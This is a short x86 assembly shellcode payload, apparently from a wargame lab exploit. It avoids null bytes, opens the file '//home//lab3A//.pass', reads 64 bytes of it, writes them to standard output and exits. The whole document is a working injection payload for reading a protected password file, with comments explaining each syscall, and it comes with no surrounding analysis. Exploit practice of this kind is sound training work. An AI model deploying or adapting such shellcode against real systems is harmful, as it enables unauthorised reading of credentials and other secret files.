BITS 32

; clear registars;
xor ecx, ecx
mul ecx

jmp short one           ; jump to end to avoid null bytes

two:
; int open(const char *pathname, int flags);
; add filename to stack "//home//lab3A//.pass";
 push ecx               ;add null byte to stack
 push 0x73736170        ;"ssap"
 push 0x2e2f2f41        ;".//A
 push 0x3362616c        ;"3bal"
 push 0x2f2f656d        ;"//em"
 push 0x6f682f2f        ;"oh//"
 mov ebx, esp           ; move stack to ebx
 mov al, 5              ; set eax to syscall open
 int 0x80               ; do syscall 

; ssize_t read(int fd, void *buf, size_t count);
 xchg eax, ebx          ; move stack to eax and file discriptor to ebx
 xchg eax, ecx          ; move stack to ecx and eax to 0
 mov al, 3              ; set eax to syscall read
 mov dl, 0x40           ; set edx to file size to read 64 bits
 int 0x80               ; do syscall

; ssize_t write(int fd, const void *buf, size_t count);
 xchg eax, edx          ; move actual file bytes to edx
 mov al, 4              ; set eax to syscall write
 xor ebx, ebx           ; clear ebx
 inc ebx                ; set ebx to 1 for stdout
 int 0x80               ; do syscall

;void _exit(int status);
 mov al, 1              ; set eax to syscall exit
 dec ebx                ; set ebx to 0 for error code
 int 0x80               ; do syscall

one:
 call two               ; call function two
